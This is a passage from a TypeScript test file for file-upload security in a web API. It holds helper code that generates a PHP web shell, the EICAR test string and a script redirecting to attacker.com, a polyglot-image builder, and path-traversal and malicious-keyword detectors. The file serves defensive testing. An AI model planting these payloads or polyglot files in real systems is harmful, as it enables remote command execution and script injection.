        keywords: 'C'.repeat(5000)
      };

      for (const [field, value] of Object.entries(oversizedMetadata)) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from('test content'), 'oversized.jpg')
          .field(field, value);

        expect(response.status).toBeOneOf([200, 201, 400, 413, 422]);
      }
    });
  });
});

/**
 * File Upload Security Test Utilities
 */
export const fileUploadSecurityTestUtils = {
  /**
   * Generates malicious file content with various payloads
   */
  generateMaliciousFileContent(type: 'webshell' | 'virus' | 'script'): Buffer {
    const payloads = {
      webshell: '<?php system($_GET["cmd"]); ?>',
      virus: 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*',
      script: '<script>document.location="http://attacker.com";</script>'
    };

    return Buffer.from(payloads[type]);
  },

  /**
   * Creates polyglot file that's valid in multiple formats
   */
  createPolyglotFile(primaryFormat: 'jpeg' | 'gif' | 'png', payload: string): Buffer {
    const headers = {
      jpeg: '\xFF\xD8\xFF\xE0\x00\x10JFIF',
      gif: 'GIF89a',
      png: '\x89PNG\r\n\x1a\n'
    };

    return Buffer.from(headers[primaryFormat] + payload);
  },

  /**
   * Validates file extension against MIME type
   */
  validateFileTypeConsistency(filename: string, mimeType: string): boolean {
    const validMappings = {
      '.jpg': ['image/jpeg'],
      '.jpeg': ['image/jpeg'],
      '.png': ['image/png'],
      '.gif': ['image/gif'],
      '.bmp': ['image/bmp'],
      '.webp': ['image/webp']
    };

    const ext = filename.toLowerCase().substring(filename.lastIndexOf('.'));
    const allowedMimes = validMappings[ext];

    return allowedMimes ? allowedMimes.includes(mimeType.toLowerCase()) : false;
  },

  /**
   * Detects potential path traversal in filename
   */
  detectPathTraversal(filename: string): boolean {
    const traversalPatterns = [
      /\.\.\//,
      /\.\.\\/,
      /%2e%2e%2f/i,
      /%2e%2e%5c/i,
      /\.\.%2f/i,
      /\.\.%5c/i
    ];

    return traversalPatterns.some(pattern => pattern.test(filename));
  },

  /**
   * Checks if filename contains malicious patterns
   */
  containsMaliciousPatterns(filename: string, content: string): {
    hasMaliciousFilename: boolean;
    hasMaliciousContent: boolean;
    detectedPatterns: string[];
  } {
    const maliciousPatterns = [
      'php', 'asp', 'jsp', 'exe', 'bat', 'sh', 'py', 'pl', 'rb',
      '<script', '<?php', '<%', 'eval(', 'system(', 'exec(',
      'DROP TABLE', 'INSERT INTO', 'SELECT * FROM'
    ];

    const filenamePatterns = maliciousPatterns.filter(pattern =>
      filename.toLowerCase().includes(pattern.toLowerCase())
    );

    const contentPatterns = maliciousPatterns.filter(pattern =>
      content.toLowerCase().includes(pattern.toLowerCase())
    );

    return {
      hasMaliciousFilename: filenamePatterns.length > 0,
      hasMaliciousContent: contentPatterns.length > 0,
      detectedPatterns: [...new Set([...filenamePatterns, ...contentPatterns])]
    };
  }
};